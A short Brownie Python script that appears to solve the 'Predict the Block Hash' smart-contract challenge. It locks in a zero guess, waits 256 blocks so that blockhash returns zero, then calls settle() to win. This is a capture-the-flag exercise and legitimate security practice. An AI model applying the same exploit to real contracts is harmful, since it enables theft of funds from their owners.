from scripts.helpful_scripts import get_account, ONE
from brownie import PredictTheBlockHashChallenge, network, Contract


def main():
    print(network.show_active())
    # accounts
    account = get_account()
    print(f"account address: {account}")

    contract_address = "0x188d03CF1D8484d64bb638d4705b5A0C4B69E8cC"

    contract = Contract.from_abi(
        PredictTheBlockHashChallenge._name,
        contract_address,
        PredictTheBlockHashChallenge.abi,
    )
    # contract.lockInGuess(0, {"from": account, "value": ONE})
    # wait 256 block

    contract.settle({"from": account})
